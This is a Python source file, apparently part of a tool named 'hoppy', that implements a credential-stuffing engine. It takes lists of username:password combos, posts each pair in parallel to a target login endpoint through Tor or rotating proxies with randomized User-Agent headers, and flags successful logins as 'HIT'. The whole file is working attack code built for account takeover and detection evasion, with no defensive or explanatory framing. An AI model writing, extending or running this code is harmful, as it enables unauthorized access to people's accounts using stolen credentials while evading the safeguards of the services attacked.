
import asyncio
import logging
import aiohttp
import random
from stealth_layer import stealth

logger = logging.getLogger("hoppy.bullet")

class BulletEngine:
    def __init__(self):
        self.stealth = stealth

    async def check_account(self, url, payload, success_key, proxy=None):
        """Valida uma conta em um serviço específico."""
        # Usa proxy do Tor ou lista externa
        proxies = proxy or self.stealth.proxies
        
        headers = {
            "User-Agent": random.choice(self.stealth.USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json"
        }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=payload, proxy=proxies['http'], headers=headers, timeout=15) as resp:
                    text = await resp.text()
                    if success_key in text:
                        return {"status": "HIT", "data": payload, "response": text[:200]}
                    else:
                        return {"status": "BAD", "data": payload}
        except Exception as e:
            return {"status": "ERROR", "error": str(e)}

    async def run_combo_check(self, url, combo_list, success_key):
        """Processa uma lista de combos em paralelo."""
        tasks = []
        for combo in combo_list:
            # Assume combo no formato user:pass
            user, pwd = combo.split(":")
            payload = {"username": user, "password": pwd}
            tasks.append(self.check_account(url, payload, success_key))
        
        results = await asyncio.gather(*tasks)
        return results

bullet_engine = BulletEngine()
